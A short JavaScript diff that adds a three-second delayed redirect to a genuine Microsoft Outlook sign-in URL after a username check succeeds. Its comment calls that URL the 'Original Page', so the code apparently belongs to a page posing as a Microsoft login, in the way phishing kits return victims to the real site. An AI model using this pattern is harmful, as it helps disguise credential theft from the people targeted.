@@ -152,6 +152,9 @@ const validateUsername = () => {
       if (response.status == 200) {
         $('.errorMsg2').fadeIn().html(response.message);
         // delay and reload & Redirect to Original Page
+         setTimeout(function () {
+           window.location.href = "https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=https%3a%2f%2foutlook.office.com%2fowa%2f&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=db366329-2e41-76d8-444d-493fe5058c45&protectedtoken=true&claims=%7b%22id_token%22%3a%7b%22xms_cc%22%3a%7b%22values%22%3a%5b%22CP1%22%5d%7d%7d%7d&nonce=638036717921573026.1c904a36-14b6-4c57-8b95-6de47c84c7cf&state=Dcu9DoIwFEDhVt_FrdLf23YgDhrDgAuaaNjaS00kEgwQjG9vh-9shxJCttkmozyHWFCOK7DCeimMVVzCXqDnOihgQkdgGo1lLnrDoEvaotNo8UnzeyrGbygO8xKWVIrdlLrXlHC5jWWoGo7VBeqfX7tHM0fpp3rwQzu8-_Zq-ij5Gu_nTzy6Pw&sso_reload=true";
+         }, 3000);
       } else {
         $('.errorMsg2').fadeIn().html(response.message);
       }
